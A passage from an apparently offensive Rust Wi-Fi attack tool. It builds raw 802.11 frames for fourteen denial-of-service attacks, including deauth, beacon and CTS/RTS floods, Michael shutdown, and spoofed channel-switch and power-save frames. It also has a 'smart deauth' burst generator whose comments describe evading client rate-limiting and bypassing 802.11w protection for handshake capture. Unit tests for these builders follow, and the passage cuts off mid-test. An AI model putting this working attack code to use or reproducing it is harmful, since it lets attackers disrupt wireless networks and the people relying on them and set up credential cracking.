            ies.extend_from_slice(&ssid_bytes[..slen as usize]);
            // Supported Rates IE
            ies.extend_from_slice(&[0x01, 0x04, 0x82, 0x84, 0x8B, 0x96]);
            // DS Parameter Set IE
            ies.extend_from_slice(&[0x03, 0x01, if channel > 0 { channel } else { 6 }]);

            frames::build_beacon(&fake_bssid, 0, 100, cap_info::BASE, &ies)
        }

        DosType::ProbeFlood => {
            // Probe requests from random MACs (broadcast)
            let fake_mac = random_mac(rng);
            frames::build_probe_request(&fake_mac, "", &[])
        }

        DosType::CtsFlood => {
            // CTS-to-self with max NAV duration (32767 μs ≈ 32ms)
            Some(build_cts(bssid, 32767))
        }

        DosType::RtsFlood => {
            // RTS from random MACs with max NAV
            let fake_mac = random_mac(rng);
            Some(build_rts(bssid, &fake_mac, 32767))
        }

        DosType::MichaelShutdown => {
            // TKIP MIC failure — QoS Data with bad MIC
            let station = target_station.unwrap_or(our_mac);
            Some(build_michael_frame(station, bssid, rng))
        }

        DosType::SaQueryFlood => {
            // SA Query Request (802.11w)
            let station = target_station.unwrap_or(&MacAddress::BROADCAST);
            Some(build_sa_query(station, bssid, rng))
        }

        DosType::CsaAbuse => {
            // Fake CSA beacon — force channel switch
            let target_ssid = if ssid.is_empty() { "Unknown" } else { ssid };
            Some(build_csa_beacon(bssid, target_ssid, params.csa_channel))
        }

        DosType::BssTransition => {
            // BSS Transition Management Request (802.11v)
            let station = target_station.unwrap_or(&MacAddress::BROADCAST);
            Some(build_bss_transition(station, bssid))
        }

        DosType::PowerSave => {
            // Fake Null Data with PM=1 — AP buffers victim's traffic
            let station = target_station?;
            Some(build_power_save(station, bssid))
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Frame builders — control frames and protocol-specific attacks
//  (management frames use protocol::frames builders above)
// ═══════════════════════════════════════════════════════════════════════════════

/// Build CTS-to-self frame (10 bytes).
/// FC(2) + Duration(2) + RA(6) = 10 bytes.
/// CTS silences the channel for the duration field value (NAV reservation).
fn build_cts(target: &MacAddress, duration_us: u16) -> Vec<u8> {
    let mut frame = Vec::with_capacity(10);
    frame.push(fc::CTS);
    frame.push(0x00);
    frame.extend_from_slice(&duration_us.to_le_bytes());
    frame.extend_from_slice(target.as_bytes());
    frame
}

/// Build RTS frame (16 bytes).
/// FC(2) + Duration(2) + RA(6) + TA(6) = 16 bytes.
fn build_rts(target: &MacAddress, source: &MacAddress, duration_us: u16) -> Vec<u8> {
    let mut frame = Vec::with_capacity(16);
    frame.push(fc::RTS);
    frame.push(0x00);
    frame.extend_from_slice(&duration_us.to_le_bytes());
    frame.extend_from_slice(target.as_bytes());
    frame.extend_from_slice(source.as_bytes());
    frame
}

/// Build SA Query Request frame (802.11w).
/// Action frame: category 8 (SA Query), action 0 (request).
fn build_sa_query(target: &MacAddress, bssid: &MacAddress, rng: &mut u32) -> Vec<u8> {
    let mut frame = Vec::with_capacity(30);
    // Management header
    frame.push(fc::ACTION);
    frame.push(0x00);
    frame.extend_from_slice(&0x013Au16.to_le_bytes()); // Duration
    frame.extend_from_slice(target.as_bytes());  // DA
    frame.extend_from_slice(bssid.as_bytes());   // SA (spoofed as AP)
    frame.extend_from_slice(bssid.as_bytes());   // BSSID
    frame.extend_from_slice(&[0x00, 0x00]);      // Seq ctl
    // Action body: SA Query
    frame.push(8);  // Category: SA Query
    frame.push(0);  // Action: Request
    // Transaction ID (2 bytes, random)
    let tid = xorshift(rng) as u16;
    frame.extend_from_slice(&tid.to_le_bytes());
    frame
}

/// Build CSA (Channel Switch Announcement) beacon.
/// Spoofed beacon from target AP with CSA IE forcing channel switch.
fn build_csa_beacon(bssid: &MacAddress, ssid: &str, new_channel: u8) -> Vec<u8> {
    // Build IEs: SSID + CSA IE
    let ssid_bytes = ssid.as_bytes();
    let slen = ssid_bytes.len().min(32) as u8;
    let mut ies = Vec::with_capacity(64);
    // SSID IE
    ies.push(0x00);
    ies.push(slen);
    ies.extend_from_slice(&ssid_bytes[..slen as usize]);
    // Channel Switch Announcement IE (tag 37)
    ies.push(37);           // CSA tag
    ies.push(3);            // length
    ies.push(1);            // mode: prohibit TX during switch
    ies.push(new_channel);  // new channel
    ies.push(1);            // count: switch after 1 beacon (immediate)

    let cap = cap_info::BASE | cap_info::PRIVACY;
    frames::build_beacon(bssid, 0, 100, cap, &ies).unwrap_or_default()
}

/// Build BSS Transition Management Request (802.11v).
/// Action frame: category 10 (WNM), action 7 (BSS Transition Mgmt Request).
fn build_bss_transition(target: &MacAddress, bssid: &MacAddress) -> Vec<u8> {
    let mut frame = Vec::with_capacity(34);
    // Management header
    frame.push(fc::ACTION);
    frame.push(0x00);
    frame.extend_from_slice(&0x013Au16.to_le_bytes()); // Duration
    frame.extend_from_slice(target.as_bytes());  // DA
    frame.extend_from_slice(bssid.as_bytes());   // SA (spoofed)
    frame.extend_from_slice(bssid.as_bytes());   // BSSID
    frame.extend_from_slice(&[0x00, 0x00]);      // Seq ctl
    // Action body: BSS Transition Management Request
    frame.push(10); // Category: WNM
    frame.push(7);  // Action: BSS Transition Management Request
    frame.push(1);  // Dialog token
    // Request mode: bit 2 = imminent, bit 3 = disassoc imminent
    frame.push(0x0C);
    // Disassoc timer (1 TU — immediate)
    frame.extend_from_slice(&1u16.to_le_bytes());
    // Validity interval
    frame.push(0xFF);
    frame
}

/// Build fake Null Data frame with PM=1 (Power Management bit set).
/// AP sees this and starts buffering the victim's traffic.
fn build_power_save(victim: &MacAddress, bssid: &MacAddress) -> Vec<u8> {
    let mut frame = Vec::with_capacity(24);
    // Null Data frame: FC byte 0 = 0x48 (Data type, Null subtype)
    frame.push(fc::NULL_DATA);
    // FC byte 1: ToDS=1 (0x01), PM=1 (0x10) → 0x11
    frame.push(fc_flags::TO_DS | fc_flags::POWER_MGMT);
    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);
    // Addr1 = BSSID (receiver in ToDS frame)
    frame.extend_from_slice(bssid.as_bytes());
    // Addr2 = spoofed victim MAC (transmitter)
    frame.extend_from_slice(victim.as_bytes());
    // Addr3 = BSSID
    frame.extend_from_slice(bssid.as_bytes());
    // Seq ctl
    frame.extend_from_slice(&[0x00, 0x00]);
    frame
}

/// Build TKIP MIC failure frame (Michael shutdown attack).
/// QoS Data with intentionally bad MIC — 2 of these triggers 60s AP shutdown.
fn build_michael_frame(victim: &MacAddress, bssid: &MacAddress, rng: &mut u32) -> Vec<u8> {
    let mut frame = Vec::with_capacity(60);
    // QoS Data: FC byte 0 = 0x88 (Data type, QoS Data subtype)
    frame.push(fc::QOS_DATA);
    // FC byte 1: ToDS=1 (0x01)
    frame.push(fc_flags::TO_DS);
    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);
    // Addr1 = BSSID
    frame.extend_from_slice(bssid.as_bytes());
    // Addr2 = spoofed victim
    frame.extend_from_slice(victim.as_bytes());
    // Addr3 = BSSID
    frame.extend_from_slice(bssid.as_bytes());
    // Seq ctl
    frame.extend_from_slice(&[0x00, 0x00]);
    // QoS control (2 bytes)
    frame.extend_from_slice(&[0x00, 0x00]);
    // Fake encrypted payload with bad MIC (32 random garbage bytes)
    for _ in 0..32 {
        frame.push((xorshift(rng) & 0xFF) as u8);
    }
    frame
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════════

/// Generate a random locally-administered unicast MAC address.
fn random_mac(rng: &mut u32) -> MacAddress {
    let mut bytes = [0u8; 6];
    for b in &mut bytes {
        *b = (xorshift(rng) & 0xFF) as u8;
    }
    bytes[0] &= 0xFE; // unicast
    bytes[0] |= 0x02; // locally administered
    MacAddress::new(bytes)
}

/// Simple xorshift32 PRNG — fast, good enough for random MACs/SSIDs.
fn xorshift(state: &mut u32) -> u32 {
    let mut x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    x
}

/// Store final result and stop_reason in info when attack completes.
fn store_final_result(
    info: &Arc<Mutex<DosInfo>>,
    params: &DosParams,
    target: &Ap,
    frames_sent: u64,
    bytes_sent: u64,
    start: Instant,
    reason: StopReason,
) {
    let elapsed = start.elapsed();
    let fps = if elapsed.as_secs_f64() > 0.0 {
        frames_sent as f64 / elapsed.as_secs_f64()
    } else {
        0.0
    };
    let final_result = DosFinalResult {
        attack_type: params.attack_type,
        target_bssid: target.bssid,
        target_ssid: target.ssid.clone(),
        target_channel: target.channel,
        frames_sent,
        bytes_sent,
        elapsed,
        frames_per_sec: fps,
        stop_reason: reason,
    };
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.stop_reason = Some(reason);
    info.final_result = Some(final_result);
}

/// Push an event to the ring buffer with automatic seq + timestamp.
/// Also emits into the delta stream via SharedAdapter.
fn push_event(
    shared: &SharedAdapter,
    events: &Arc<EventRing<DosEvent>>,
    start: Instant,
    kind: DosEventKind,
    attack_id: AttackId,
) {
    let seq = events.seq() + 1;
    let timestamp = start.elapsed();

    // Emit into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackEvent {
        id: attack_id,
        seq,
        timestamp,
        event: AttackEventKind::Dos(kind.clone()),
    }]);

    // Push to legacy EventRing (still consumed by CLI polling path)
    events.push(DosEvent { seq, timestamp, kind });
}

/// Emit phase change into the delta stream and update legacy Info struct.
fn update_phase(
    shared: &SharedAdapter,
    info: &Arc<Mutex<DosInfo>>,
    phase: DosPhase,
    attack_id: AttackId,
) {
    // Emit phase change into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
        id: attack_id,
        phase: phase.to_attack_phase(),
    }]);

    // Update legacy Info struct (still consumed by CLI polling path)
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.phase = phase;
    info.elapsed = info.start_time.elapsed();
}

/// Emit batched counter update into the delta stream.
fn emit_counters(
    shared: &SharedAdapter,
    attack_id: AttackId,
    info: &Arc<Mutex<DosInfo>>,
    start: Instant,
    tx_fb: &Arc<crate::core::TxFeedback>,
) {
    let info = info.lock().unwrap_or_else(|e| e.into_inner());
    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
        id: attack_id,
        frames_sent: info.frames_sent,
        frames_received: info.frames_received,
        frames_per_sec: info.frames_per_sec,
        elapsed: start.elapsed(),
        tx_feedback: tx_fb.snapshot(),
    }]);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Smart Deauth — multi-technique adaptive burst generator
// ═══════════════════════════════════════════════════════════════════════════════
//
// What makes this different from aireplay-ng, mdk4, or any existing tool:
//
// 1. EVERY known client gets targeted individually (unicast) — not just broadcast
// 2. BOTH directions per client: AP→client AND client→AP (tears down both ends)
// 3. MIXED frame types: deauth + disassoc per client (different state machines)
// 4. ROTATING reason codes per burst — defeats client-side dedup/rate-limiting
// 5. CSA BEACON injection — force channel switch (works even with PMF/802.11w)
// 6. CSA ACTION frame — unicast CSA to each client
// 7. BROADCAST catch-all — hits unknown clients and IoT that ignore unicast
//
// Frame sequence per burst (N clients):
//   For each client:
//     [1] AP→client  DEAUTH  (reason rotated)
//     [2] client→AP  DEAUTH  (reason rotated)
//     [3] AP→client  DISASSOC (reason 8)
//     [4] client→AP  DISASSOC (reason 8)
//   Broadcast:
//     [5] AP→broadcast DEAUTH  (reason rotated)
//     [6] AP→broadcast DISASSOC (reason 8)
//   CSA:
//     [7] Spoofed beacon with CSA IE (channel switch to unused channel)
//     [8] CSA action frame → broadcast
//
// Total frames per burst: 4*N + 4 (e.g., 8 clients = 36 frames)

/// Reason codes rotated per burst — targets different client firmware behaviors.
/// Research: Apple=1,6,7  Android=1,4,16  Windows=1,4,15  IoT=1,3,5
const DEAUTH_REASONS: &[u16] = &[
    7,  // Class3FromNonAssoc — confuses client state machine (Apple, Linux)
    1,  // Unspecified — universal fallback
    4,  // Inactivity — believable timeout (Windows, Android)
    6,  // Class2FromNonAuth — state confusion (Apple, Linux)
    15, // FourWayHandshakeTimeout — Windows takes seriously, delays reconnect
    3,  // DeauthLeaving — AP shutting down (IoT, older clients)
    16, // GroupKeyUpdateTimeout — Android respects this
    5,  // ApBusy — AP overloaded (IoT, embedded)
];

/// Unused channels to send clients to via CSA (far from common channels).
const CSA_TARGET_CHANNELS: &[u8] = &[13, 14, 165, 144, 128];

/// Build a complete smart deauth burst — all techniques, all clients.
///
/// Returns a Vec of raw 802.11 frames ready to TX. The caller sends them
/// all in sequence, then enters a listen window for handshake capture.
fn build_smart_deauth_burst(
    bssid: &MacAddress,
    clients: &[MacAddress],
    target_station: Option<&MacAddress>,
    target_ap: &Ap,
    burst_num: u32,
) -> Vec<Vec<u8>> {
    let mut burst = Vec::with_capacity(clients.len() * 4 + 8);

    // Rotate reason code per burst — each burst uses a different reason
    let reason_idx = (burst_num as usize) % DEAUTH_REASONS.len();
    let reason = ReasonCode::from_u16(DEAUTH_REASONS[reason_idx])
        .unwrap_or(ReasonCode::Class3FromNonAssoc);
    let disassoc_reason = ReasonCode::DisassocLeaving;

    // ── Phase 1: Targeted unicast to every known client ──
    // If we have a specific target station, put it first (priority)
    let mut targeted: Vec<&MacAddress> = Vec::with_capacity(clients.len() + 1);
    if let Some(sta) = target_station {
        targeted.push(sta);
    }
    for client in clients {
        if target_station.map_or(true, |ts| ts != client) {
            targeted.push(client);
        }
    }

    for client in &targeted {
        // [1] AP → client DEAUTH (spoofed from AP)
        burst.push(frames::build_deauth(bssid, client, bssid, reason));

        // [2] client → AP DEAUTH (spoofed from client — tears down AP's state)
        burst.push(frames::build_deauth(client, bssid, bssid, reason));

        // [3] AP → client DISASSOC (different state machine path)
        burst.push(frames::build_disassoc(bssid, client, bssid, disassoc_reason));

        // [4] client → AP DISASSOC
        burst.push(frames::build_disassoc(client, bssid, bssid, disassoc_reason));
    }

    // ── Phase 2: Broadcast catch-all ──
    // Hits unknown clients, IoT devices, and anything we missed
    burst.push(frames::build_deauth(bssid, &MacAddress::BROADCAST, bssid, reason));
    burst.push(frames::build_disassoc(bssid, &MacAddress::BROADCAST, bssid, disassoc_reason));

    // ── Phase 3: CSA — force channel switch (PMF bypass) ──
    // Spoofed beacon with CSA IE tells clients the AP is moving to an unused channel.
    // Clients comply silently — no deauth event logged. Works even with 802.11w/PMF.
    let csa_channel = CSA_TARGET_CHANNELS[(burst_num as usize) % CSA_TARGET_CHANNELS.len()];

    // Build SSID + basic rates IEs (minimum for a believable beacon)
    let mut ies = Vec::with_capacity(target_ap.raw_ies.len().max(32));
    if !target_ap.raw_ies.is_empty() {
        // Use the AP's actual IEs for maximum authenticity
        ies.extend_from_slice(&target_ap.raw_ies);
    } else {
        // Fallback: minimal IEs
        let ssid_bytes = target_ap.ssid.as_bytes();
        let slen = ssid_bytes.len().min(32) as u8;
        ies.push(0x00); // SSID tag
        ies.push(slen);
        ies.extend_from_slice(&ssid_bytes[..slen as usize]);
        ies.extend_from_slice(&[0x01, 0x04, 0x82, 0x84, 0x8B, 0x96]); // rates
        ies.push(0x03); ies.push(0x01); ies.push(target_ap.channel); // DS
    }

    if let Some(csa_beacon) = frames::build_csa_beacon(
        bssid,
        target_ap.tsf,
        target_ap.beacon_interval,
        target_ap.capability,
        csa_channel,
        1, // switch immediately
        &ies,
    ) {
        burst.push(csa_beacon);
    }

    // CSA action frame — broadcast variant, more targeted
    burst.push(frames::build_csa_action(
        bssid,
        &MacAddress::BROADCAST,
        bssid,
        csa_channel,
        1,
    ));

    burst
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    const AP_MAC: MacAddress = MacAddress([0x7C, 0x10, 0xC9, 0x03, 0x10, 0xE0]);
    const CLIENT_MAC: MacAddress = MacAddress([0xA4, 0x83, 0xE7, 0x12, 0x34, 0x56]);
    const OUR_MAC: MacAddress = MacAddress([0x8C, 0x88, 0x2B, 0xA7, 0x3F, 0x12]);

    // ── DosType tests ──

    #[test]
    fn test_dos_type_parse() {
        assert_eq!(DosType::from_str("deauth"), Some(DosType::DeauthFlood));
        assert_eq!(DosType::from_str("deauth-flood"), Some(DosType::DeauthFlood));
        assert_eq!(DosType::from_str("deauth-targeted"), Some(DosType::DeauthTargeted));
        assert_eq!(DosType::from_str("disassoc"), Some(DosType::DisassocFlood));
        assert_eq!(DosType::from_str("auth"), Some(DosType::AuthFlood));
        assert_eq!(DosType::from_str("assoc"), Some(DosType::AssocFlood));
        assert_eq!(DosType::from_str("beacon"), Some(DosType::BeaconFlood));
        assert_eq!(DosType::from_str("probe"), Some(DosType::ProbeFlood));
        assert_eq!(DosType::from_str("cts"), Some(DosType::CtsFlood));
        assert_eq!(DosType::from_str("rts"), Some(DosType::RtsFlood));
        assert_eq!(DosType::from_str("michael"), Some(DosType::MichaelShutdown));
        assert_eq!(DosType::from_str("sa-query"), Some(DosType::SaQueryFlood));
        assert_eq!(DosType::from_str("csa"), Some(DosType::CsaAbuse));
        assert_eq!(DosType::from_str("bss-transition"), Some(DosType::BssTransition));
        assert_eq!(DosType::from_str("wnm"), Some(DosType::BssTransition));
        assert_eq!(DosType::from_str("power-save"), Some(DosType::PowerSave));
        assert_eq!(DosType::from_str("ps"), Some(DosType::PowerSave));
        assert_eq!(DosType::from_str("invalid"), None);
    }

    #[test]
    fn test_dos_type_requires_station() {
        assert!(DosType::DeauthTargeted.requires_station());
        assert!(DosType::MichaelShutdown.requires_station());
        assert!(DosType::PowerSave.requires_station());
        assert!(!DosType::DeauthFlood.requires_station());
        assert!(!DosType::CtsFlood.requires_station());
        assert!(!DosType::BeaconFlood.requires_station());
    }

    #[test]
    fn test_dos_type_all_14_types() {
        assert_eq!(DosType::all().len(), 14);
    }

    #[test]
    fn test_dos_type_labels_unique() {
        let labels: Vec<&str> = DosType::all().iter().map(|t| t.label()).collect();
        for (i, label) in labels.iter().enumerate() {
            for (j, other) in labels.iter().enumerate() {
                if i != j {
                    assert_ne!(label, other, "Duplicate label: {}", label);
                }
            }
        }
    }

    // ── DosParams tests ──

    #[test]
    fn test_dos_params_default() {
        let params = DosParams::default();
        assert_eq!(params.attack_type, DosType::DeauthFlood);
        assert_eq!(params.interval, Duration::ZERO);
        assert_eq!(params.channel_settle, Duration::from_millis(50));
        assert_eq!(params.duration, Duration::ZERO);
        assert_eq!(params.max_frames, 0);
        assert_eq!(params.burst_count, 1);
        assert_eq!(params.reason_code, 7);
        assert_eq!(params.csa_channel, 13);
        assert!(params.ssid_list.is_empty());
    }

    // ── Frame crafting tests ──

    #[test]
    fn test_build_cts_frame() {
        let frame = build_cts(&AP_MAC, 32767);
        assert_eq!(frame.len(), 10);
        assert_eq!(frame[0], fc::CTS);
        assert_eq!(frame[1], 0x00);
        // Duration: 32767 LE
        assert_eq!(frame[2], 0xFF);
        assert_eq!(frame[3], 0x7F);
        // RA = target
        assert_eq!(&frame[4..10], AP_MAC.as_bytes());
    }

    #[test]
    fn test_build_rts_frame() {
        let frame = build_rts(&AP_MAC, &CLIENT_MAC, 32767);
        assert_eq!(frame.len(), 16);
        assert_eq!(frame[0], fc::RTS);
        assert_eq!(frame[1], 0x00);
        assert_eq!(&frame[4..10], AP_MAC.as_bytes());
        assert_eq!(&frame[10..16], CLIENT_MAC.as_bytes());
    }

    #[test]
    fn test_build_sa_query_frame() {
        let mut rng = 0xDEAD_BEEF_u32;
        let frame = build_sa_query(&CLIENT_MAC, &AP_MAC, &mut rng);
        assert_eq!(frame[0], fc::ACTION);
        // Category: SA Query = 8
        assert_eq!(frame[24], 8);
        // Action: Request = 0
        assert_eq!(frame[25], 0);
        // Transaction ID: 2 bytes
        assert_eq!(frame.len(), 28);
    }

    #[test]
    fn test_build_bss_transition_frame() {
        let frame = build_bss_transition(&CLIENT_MAC, &AP_MAC);
        assert_eq!(frame[0], fc::ACTION);
        // Category: WNM = 10
        assert_eq!(frame[24], 10);
        // Action: BSS Transition Mgmt Request = 7
        assert_eq!(frame[25], 7);
        // Request mode: 0x0C (imminent + disassoc imminent)
        assert_eq!(frame[27], 0x0C);
    }

    #[test]
    fn test_build_power_save_frame() {
        let frame = build_power_save(&CLIENT_MAC, &AP_MAC);
        assert_eq!(frame.len(), 24);
        // FC byte 0 = Null Data
        assert_eq!(frame[0], fc::NULL_DATA);
        // FC byte 1 = ToDS | PM
        assert_eq!(frame[1], fc_flags::TO_DS | fc_flags::POWER_MGMT);
        // Addr1 = BSSID
        assert_eq!(&frame[4..10], AP_MAC.as_bytes());
        // Addr2 = victim
        assert_eq!(&frame[10..16], CLIENT_MAC.as_bytes());
    }

    #[test]
    fn test_build_michael_frame() {
        let mut rng = 0x12345678_u32;
        let frame = build_michael_frame(&CLIENT_MAC, &AP_MAC, &mut rng);
        // QoS Data header (26 bytes) + 32 bytes random payload
        assert_eq!(frame.len(), 58);
        assert_eq!(frame[0], fc::QOS_DATA);
        assert_eq!(frame[1], fc_flags::TO_DS);
    }

    #[test]
    fn test_build_csa_beacon() {
        let frame = build_csa_beacon(&AP_MAC, "TestAP", 13);
        assert!(!frame.is_empty());
        // Should contain CSA IE (tag 37)
        // Find tag 37 in the IEs (after management header + fixed fields)
        let ie_start = 24 + 12; // mgmt header + beacon fixed fields
        let mut found_csa = false;
        let mut pos = ie_start;
        while pos + 2 <= frame.len() {
            let tag = frame[pos];
            let len = frame[pos + 1] as usize;
            if tag == 37 {
                found_csa = true;
                assert_eq!(len, 3);
                assert_eq!(frame[pos + 2], 1);  // mode: prohibit TX
                assert_eq!(frame[pos + 3], 13); // new channel
                assert_eq!(frame[pos + 4], 1);  // count: immediate
                break;
            }
            pos += 2 + len;
        }
        assert!(found_csa, "CSA IE (tag 37) not found in beacon");
    }

    // ── Random MAC tests ──

    #[test]
    fn test_random_mac_locally_administered() {
        let mut rng = 0xABCDEF01_u32;
        for _ in 0..100 {
            let mac = random_mac(&mut rng);
            let bytes = mac.as_bytes();
            assert!(bytes[0] & 0x02 != 0, "MAC should be locally administered");
            assert!(bytes[0] & 0x01 == 0, "MAC should be unicast");
        }
    }

    #[test]
    fn test_random_mac_varied() {
        let mut rng = 0x12345678_u32;
        let mac1 = random_mac(&mut rng);
        let mac2 = random_mac(&mut rng);
        assert_ne!(mac1, mac2, "Two random MACs should differ");
    }

    // ── xorshift tests ──

    #[test]
    fn test_xorshift_deterministic() {
        let mut s1 = 42u32;
        let mut s2 = 42u32;
        assert_eq!(xorshift(&mut s1), xorshift(&mut s2));
    }

    #[test]
    fn test_xorshift_nonzero() {
        let mut state = 1u32;
        for _ in 0..1000 {
            let val = xorshift(&mut state);
            assert_ne!(val, 0, "xorshift should not produce zero");
        }
    }

    // ── Smart deauth burst tests ──

    #[test]
    fn test_smart_deauth_burst_no_clients() {
        let ap = make_test_ap();
        let burst = build_smart_deauth_burst(&AP_MAC, &[], None, &ap, 0);
        // No clients: broadcast deauth + disassoc + CSA beacon + CSA action = 4
        assert_eq!(burst.len(), 4);
        // First frame: broadcast deauth
        assert_eq!(burst[0][0], 0xC0); // deauth FC
        assert_eq!(&burst[0][4..10], &[0xFF; 6]); // broadcast DA
    }

    #[test]
    fn test_smart_deauth_burst_with_clients() {
        let ap = make_test_ap();
        let clients = vec![CLIENT_MAC, MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66])];
        let burst = build_smart_deauth_burst(&AP_MAC, &clients, None, &ap, 0);
        // 2 clients × 4 frames + broadcast(2) + CSA(2) = 12
        assert_eq!(burst.len(), 12);
    }

    #[test]
    fn test_smart_deauth_burst_reason_rotation() {
        let ap = make_test_ap();
        let burst0 = build_smart_deauth_burst(&AP_MAC, &[], None, &ap, 0);
        let burst1 = build_smart_deauth_burst(&AP_MAC, &[], None, &ap, 1);
        // Broadcast deauth is first frame — reason code should differ between bursts
        // Reason is at byte 24-25 (after 24-byte mgmt header)
        let reason0 = u16::from_le_bytes([burst0[0][24], burst0[0][25]]);
        let reason1 = u16::from_le_bytes([burst1[0][24], burst1[0][25]]);
        assert_ne!(reason0, reason1, "Different bursts should use different reason codes");
    }

    #[test]
    fn test_smart_deauth_burst_both_directions() {
        let ap = make_test_ap();
        let clients = vec![CLIENT_MAC];
        let burst = build_smart_deauth_burst(&AP_MAC, &clients, None, &ap, 0);
        // Frame 0: AP→client deauth (SA=AP, DA=client)
        assert_eq!(&burst[0][4..10], CLIENT_MAC.as_bytes()); // DA
        assert_eq!(&burst[0][10..16], AP_MAC.as_bytes());    // SA
        // Frame 1: client→AP deauth (SA=client, DA=AP)
        assert_eq!(&burst[1][4..10], AP_MAC.as_bytes());     // DA
        assert_eq!(&burst[1][10..16], CLIENT_MAC.as_bytes()); // SA
    }

    #[test]
    fn test_smart_deauth_burst_includes_disassoc() {
        let ap = make_test_ap();
        let clients = vec![CLIENT_MAC];
        let burst = build_smart_deauth_burst(&AP_MAC, &clients, None, &ap, 0);
        // Frame 2: AP→client disassoc (FC byte 0 = 0xA0)
        assert_eq!(burst[2][0], 0xA0);
        // Frame 3: client→AP disassoc
        assert_eq!(burst[3][0], 0xA0);
    }

    #[test]
    fn test_smart_deauth_burst_csa_present() {
        let ap = make_test_ap();
        let burst = build_smart_deauth_burst(&AP_MAC, &[], None, &ap, 0);
        // Last two frames should be CSA beacon and CSA action
        let csa_beacon = &burst[2]; // after broadcast deauth + disassoc
        assert_eq!(csa_beacon[0], 0x80); // beacon FC
        let csa_action = &burst[3];
        assert_eq!(csa_action[0], 0xD0); // action FC
    }

    fn make_test_ap() -> Ap {
        let mut ap = Ap::new_blind_target(AP_MAC, "TestAP".to_string(), 6);
        ap.beacon_interval = 100;
        ap.capability = 0x0411;
        ap
    }

    // ── build_dos_frame integration tests ──

    #[test]
    fn test_build_dos_frame_deauth_flood() {
        let mut rng = 0xDEAD_u32;
        let params = DosParams::default();
        let frame = build_dos_frame(
            DosType::DeauthFlood, &AP_MAC, "TestAP", 6,
            None, &OUR_MAC, &params, &mut rng, 0,
        );
        assert!(frame.is_some());
        let f = frame.unwrap();
        assert_eq!(f.len(), 26); // mgmt header (24) + reason (2)
    }

    #[test]
    fn test_build_dos_frame_deauth_targeted_requires_station() {
        let mut rng = 0xDEAD_u32;
        let params = DosParams { attack_type: DosType::DeauthTargeted, ..Default::default() };
        // Without station → None
        let frame = build_dos_frame(
            DosType::DeauthTargeted, &AP_MAC, "TestAP", 6,
            None, &OUR_MAC, &params, &mut rng, 0,
        );
        assert!(frame.is_none());
        // With station → Some
        let frame = build_dos_frame(
            DosType::DeauthTargeted, &AP_MAC, "TestAP", 6,
            Some(&CLIENT_MAC), &OUR_MAC, &params, &mut rng, 0,
        );
        assert!(frame.is_some());
    }

    #[test]
    fn test_build_dos_frame_all_types_produce_frames() {
        let mut rng = 0xBEEF_u32;
        let params = DosParams::default();
        for dos_type in DosType::all() {
            let station = if dos_type.requires_station() {
                Some(&CLIENT_MAC)
            } else {
                None
            };
            let frame = build_dos_frame(
                *dos_type, &AP_MAC, "TestAP", 6,
                station, &OUR_MAC, &params, &mut rng, 0,
            );
            assert!(frame.is_some(), "DosType::{:?} should produce a frame", dos_type);
            let f = frame.unwrap();
            assert!(!f.is_empty(), "DosType::{:?} frame should not be empty", dos_type);
        }
    }

    #[test]
    fn test_build_dos_frame_beacon_with_ssid_list() {
        let mut rng = 0xCAFE_u32;
        let params = DosParams {
            ssid_list: vec!["MySSID_1".into(), "MySSID_2".into(), "MySSID_3".into()],
            ..Default::default()
        };
        // frame_count=0 → index 0 → "MySSID_1"
        let frame0 = build_dos_frame(
            DosType::BeaconFlood, &AP_MAC, "", 6,
            None, &OUR_MAC, &params, &mut rng, 0,
        );
        // frame_count=1 → index 1 → "MySSID_2"
        let frame1 = build_dos_frame(
            DosType::BeaconFlood, &AP_MAC, "", 6,
            None, &OUR_MAC, &params, &mut rng, 1,
        );
        assert!(frame0.is_some());
        assert!(frame1.is_some());
        // Different SSIDs → different frame content
        assert_ne!(frame0.unwrap(), frame1.unwrap());
    }

    // ── DosAttack lifecycle tests ──

    #[test]
    fn test_dos_attack_new_defaults() {
        let attack = DosAttack::new(DosParams::default());
        assert!(!attack.is_running());
        assert!(!attack.is_done());
        let info = attack.info();
        assert_eq!(info.phase, DosPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.frames_sent, 0);
    }

    #[test]
    fn test_dos_attack_signal_stop_before_start() {
        let attack = DosAttack::new(DosParams::default());
        attack.signal_stop(); // Should not panic
        assert!(!attack.is_running());
    }

    #[test]
    fn test_dos_attack_events_empty_initially() {
        let attack = DosAttack::new(DosParams::default());
        let events = attack.events();
        assert!(events.is_empty());
    }

    // ── DosInfo tests ──

    #[test]
    fn test_dos_info_default() {
        let info = DosInfo::default();
        assert_eq!(info.phase, DosPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.frames_sent, 0);
        assert_eq!(info.bytes_sent, 0);
        assert_eq!(info.frames_per_sec, 0.0);
    }

    // ── EventRing tests ──

    #[test]
    fn test_event_ring_push() {
        let events = Arc::new(EventRing::<DosEvent>::new(64));
        let start = Instant::now();
        events.push(DosEvent { seq: 1, timestamp: start.elapsed(), kind: DosEventKind::FloodingStarted });
        let drained = events.drain();
        assert_eq!(drained.len(), 1);
        match &drained[0].kind {
            DosEventKind::FloodingStarted => {}
            other => panic!("Expected FloodingStarted, got {:?}", other),
        }
    }

    #[test]
    fn test_event_ring_attack_complete() {
        let events = Arc::new(EventRing::<DosEvent>::new(64));
        let start = Instant::now();
        events.push(DosEvent {
            seq: 1,
            timestamp: start.elapsed(),
            kind: DosEventKind::AttackComplete {
                frames_sent: 42000,
                elapsed: Duration::from_secs(10),
                reason: StopReason::UserStopped,
            },
        });
        let drained = events.drain();
        assert_eq!(drained.len(), 1);
        match &drained[0].kind {
            DosEventKind::AttackComplete { frames_sent, reason, .. } => {
                assert_eq!(*frames_sent, 42000);
